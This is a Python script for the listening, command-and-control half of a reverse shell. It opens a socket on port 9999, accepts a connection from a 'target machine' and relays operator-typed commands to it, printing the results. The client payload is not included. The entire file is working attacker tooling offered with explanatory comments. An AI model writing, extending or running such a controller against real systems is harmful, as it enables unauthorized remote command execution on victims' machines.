import socket
import sys
import time
import threading
from queue import Queue


# Create Socket
def SocketCreate():
	try:
		global Host
		global Port
		global Socket

		Host = ''  # Currently Using the Default IP
		Port = 9999  # Listening on this Port
		Socket = socket.socket()  # Creating a new Socket

	except socket.error as msg:
		print("Socket Creation Failed: " + str(msg))


# Binding Socket To The Port and Wait For Connection From Client
def SocketBind():
	try:
		global Host
		global Port
		global Socket

		print("Binding The Socket to Port : " + str(Port))

		Socket.bind((Host, Port))
		Socket.listen(5)  # Accept 5 Connections

	except socket.error as msg:
		print("Socket Binding Error: " + str(msg) + "\n")
		SocketBind()  # Retry Socket Binding


# Establish a Connection with the Client (Socket Must be Listening)
def SocketAccept():
	Connection, Address = Socket.accept()
	print("Connection Has Been Established | IP " + Address[0] + " | Port " + str(Address[1]))

	SendCommands(Connection)
	Connection.close()


# Send Commands to Target Machine(Client)
def SendCommands(Connection):
	while True:

		# User Input - Server Side
		CMD = input()

		# When CMD Command Issued is 'quit', then
		if CMD == 'quit':
			# Terminate all Connections to the Client
			Connection.close()
			Socket.close()
			sys.exit()

		# When CMD Command is Any Other Command, then
		if len(str.encode(CMD)) > 0:
			# str.encode(CMD) = Convert String CMD to Bytes
			Connection.send(str.encode(CMD))

			# Response From Client In Bytes Converted to a Readable String
			clientResponse = str(Connection.recv(1024), 'UTF-8')

			# Display the Clients Response to The User - Server Side
			print(clientResponse, end = '')


def main():
	SocketCreate()
	SocketBind()
	SocketAccept()


# Run Program
main()
